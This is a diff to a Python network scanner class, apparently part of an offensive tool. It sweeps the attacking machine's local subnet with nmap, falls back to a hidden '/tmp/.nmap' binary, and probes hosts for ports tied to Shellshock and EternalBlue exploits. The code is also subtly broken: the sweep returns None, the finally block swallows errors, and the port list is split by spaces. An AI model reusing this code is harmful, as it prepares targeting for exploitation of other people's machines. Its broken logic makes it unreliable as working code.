@@ -11,8 +11,7 @@ socket.setdefaulttimeout(2)
 class scanner:
     #class doesn't need external arguments upon instantiation
     def __init__(self):
-        #declare socket and regex matcher objects up here to save the headache
-        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        #declare regex matcher up here to save the headache
         self.ip_find = re.compile('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}')
         return
 
@@ -33,13 +32,27 @@ class scanner:
         """
         Function to initiate an nmap ping scan on the immedate network of the attacking machine
         """
-        possible_targets = []
         #assume 24 bit netmask
         ip_mask = '.'.join(ip_addr.split('.')[:-1]) + '.0/24'
         cmd = ['nmap', '-sn', ip_mask]
         cmd_alt = ['/tmp/.nmap', '-sn', ip_mask]
-        return self.ip_find.findall(subprocess.run(' '.join(cmd), shell=True)).remove(ip_addr)
+        try:
+            scan_data = subprocess.check_output(' '.join(cmd), shell=True)
+        except:
+            scan_data = subprocess.check_output(' '.join(cmd_alt), shell=True)
+        finally:
+            return self.ip_find.findall(scan_data.decode()).remove(ip_addr)
 
-    #use the socket library to attempt to connect to a port; returns 0 if successful
-    def port_scan(self, target_ip, portnum):
-        return self.sock.connect_ex((target_ip, portnum))
+    def identify_ports(self, ip_addr):
+        """
+        Function to initiate nmap scan of chosen hosts for the ports needed
+        for our exploits: 80 for Shellshock, 139 & 445 for EternalBlue
+        """
+        cmd = ['nmap', '-Pn', '-O', '-A', '-p 80, 139, 445', ip_addr]
+        cmd_alt = ['/tmp/.nmap', '-Pn', '-O', '-A', '-p 80, 139, 445', ip_addr]
+        try:
+            scan_data = subprocess.check_output(' '.join(cmd), shell=True)
+        except:
+            scan_data = subprocess.check_output(' '.join(cmd_alt), shell=True)
+        finally:
+            return scan_data.decode()
